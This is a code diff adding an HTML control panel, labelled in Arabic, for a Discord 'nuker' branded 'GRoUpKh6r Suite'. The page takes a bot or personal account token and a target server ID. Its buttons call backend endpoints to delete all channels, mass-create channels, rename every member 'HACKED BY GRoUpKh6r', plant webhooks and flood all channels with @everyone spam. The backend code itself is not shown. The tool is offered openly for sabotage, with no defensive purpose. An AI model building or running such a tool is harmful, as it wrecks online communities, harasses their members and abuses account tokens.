@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nuker-panel - GRoUpKh6r Suite</title>
+    <style>
+        body { background-color: #030303; color: #ff0044; font-family: monospace; padding: 15px; }
+        .panel { max-width: 650px; margin: auto; background: #0c0c0c; padding: 20px; border: 2px solid #ff0044; box-shadow: 0 0 20px #ff0044; }
+        h1, h3 { text-align: center; color: #00ffcc; }
+        input, select, button { width: 100%; margin: 8px 0; padding: 12px; background: #000; color: #00ffcc; border: 1px solid #00ffcc; font-family: monospace; }
+        button { cursor: pointer; font-weight: bold; background: #ff0044; color: #fff; border: none; }
+        button:hover { background: #00ffcc; color: #000; }
+        .rights { text-align: center; color: #ffff00; font-size: 16px; font-weight: bold; margin-bottom: 10px; border-bottom: 1px dashed #ffff00; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <!-- مشغل الموسيقى الأجنبية الحماسية (يتكرر تلقائياً) -->
+    <audio id="hackAudio" src="https://www.bensound.com/bensound-music/bensound-dubstep.mp3" loop autoplay></audio>
+
+    <div class="panel">
+        <div class="rights">GRoUpKh6r - Nuker-panel Suite</div>
+        <h1>DISCORD NUKER CORE</h1>
+
+        <label>نوع المصادقة:</label>
+        <select id="isBot">
+            <option value="true">Bot Token (توكن بوت)</option>
+            <option value="false">User Token (توكن حساب شخصي)</option>
+        </select>
+
+        <label>التوكن (Token):</label>
+        <input type="password" id="token" placeholder="أدخل توكن البوت أو الحساب">
+
+        <label>معرف السيرفر المستهدف (Server ID):</label>
+        <input type="text" id="guildId" placeholder="أدخل ID السيرفر المطلوب">
+
+        <hr style="border-color: #ff0044;">
+
+        <h3>لوحة أوامر الصلاحيات والتحكم السريع</h3>
+
+        <label>إعدادات الرومات:</label>
+        <input type="text" id="channelName" value="nuker-x-groupkh6r">
+        <input type="number" id="channelCount" value="30">
+        <button onclick="runAction('/api/channels/create', {name: document.getElementById('channelName').value, count: document.getElementById('channelCount').value})">إنشاء رومات جماعية بأقصى سرعة</button>
+        <button onclick="runAction('/api/channels/delete')">حذف وتدمير جميع الرومات</button>
+
+        <label>إدارة الأعضاء والألقاب:</label>
+        <input type="text" id="newNickname" value="HACKED BY GRoUpKh6r">
+        <button onclick="runAction('/api/members/nicknames', {newNickname: document.getElementById('newNickname').value})">تغيير ألقاب جميع الأعضاء</button>
+
+        <label>صلاحيات الرتب (Group Rights & Ranks):</label>
+        <input type="text" id="targetUserId" placeholder="معرف العضو المستهدف (User ID)">
+        <input type="text" id="roleId" placeholder="معرف الرتبة المراد منحها (Role ID)">
+        <button onclick="runAction('/api/roles/assign', {targetUserId: document.getElementById('targetUserId').value, roleId: document.getElementById('roleId').value})">منح رتبة / صلاحيات المجموعة للعضو</button>
+
+        <label>التخريب والسبام:</label>
+        <input type="text" id="webhookName" value="Nuker-Webhook">
+        <button onclick="runAction('/api/webhooks', {webhookName: document.getElementById('webhookName').value})">زرع Webhooks في كافة الرومات</button>
+
+        <input type="text" id="spamMessage" value="@everyone GRoUpKh6r & NUKER-PANEL HACKED THIS SERVER - MAXIMUM SPEED">
+        <button onclick="runAction('/api/spam', {message: document.getElementById('spamMessage').value})">بدء السبام المستمر في جميع الرومات</button>
+    </div>
+
+    <script>
+        document.body.addEventListener('click', () => {
+            const audio = document.getElementById('hackAudio');
+            if(audio.paused) audio.play();
+        }, { once: true });
+
+        async function runAction(endpoint, extraData = {}) {
+            const token = document.getElementById('token').value;
+            const guildId = document.getElementById('guildId').value;
+            const isBot = document.getElementById('isBot').value === 'true';
+
+            if (!token || !guildId) {
+                alert('خطأ: يجب إدخال التوكن ومعرف السيرفر أولاً!');
+                return;
+            }
+
+            const res = await fetch(endpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token, guildId, isBot, ...extraData })
+            });
+
+            const data = await res.json();
+            alert(data.message || JSON.stringify(data));
+        }
+    </script>
+</body>
+</html>
